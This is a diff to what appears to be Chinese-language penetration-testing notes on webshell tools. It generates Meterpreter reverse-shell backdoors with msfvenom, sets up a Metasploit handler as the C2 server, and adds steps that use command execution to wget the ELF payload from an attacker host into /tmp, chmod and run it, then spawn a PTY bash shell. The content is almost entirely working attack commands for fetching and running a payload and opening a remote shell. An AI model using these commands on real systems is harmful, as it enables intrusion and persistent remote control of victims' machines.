@@ -35,14 +35,37 @@ WebShell管理工具
 - Metasploit生成后门
 	+ ``msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.131 -f asp > shell.asp`` 
 	+ ``msfvenom  -p linux/x64/meterpreter/reverse_tcp LHOST=118.195.199.66 LPORT=7777 -f elf > shell_x64.elf``
-	+ 连接后门
+	+ 开启C2服务
 		::
 		
 			use exploit/multi/handler
 			set PAYLOAD windows/meterpreter/reverse_tcp
 			set LHOST 10.10.10.131
+			set LPORT 7777
 			exploit
-			打开页面：http://10.10.10.130/shell.asp
+			
+	+ 上传木马
+		
+		::
+		
+		
+			命令执行上传：
+			system('wget http://10.10.10.131/shell_x64.elf -P /tmp/')
+			
+	+ 执行木马
+	
+		::
+			
+			system('chmod 777 /tmp/shell_x64.elf')
+			system('/tmp/shell_x64.elf')
+			注意tmp目录有写入执行权限。
+		
+			web页面：system("curl http://10.10.10.131/shell.asp")
+				
+	+ 交互
+		::
+		
+		
 			进入交互页面meterpreter会话执行以下：
 			shell
 			python -c "import pty;pty.spawn('/bin/bash')"
